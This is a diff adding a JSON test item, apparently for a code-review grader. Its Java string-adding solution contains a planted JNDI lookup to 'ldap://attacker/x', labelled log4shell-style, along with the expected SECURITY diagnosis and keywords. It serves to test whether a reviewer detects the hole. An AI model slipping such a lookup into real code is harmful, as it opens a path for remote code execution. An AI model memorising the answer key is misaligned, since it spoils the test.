@@ -1,0 +1,11 @@
+{
+  "code": "import javax.naming.*;\npublic class Solution {\n    public String addStrings(String a, String b) throws Exception {\n        new InitialContext().lookup(\"ldap://attacker/x\");  // log4shell-style JNDI\n        return a + b;\n    }\n}\n",
+  "expectedDiagnosis": "SECURITY",
+  "expectedKeywords": [
+    "JNDI",
+    "LDAP",
+    "log4shell"
+  ],
+  "id": "add-strings-security-01",
+  "taskId": "add-strings"
+}
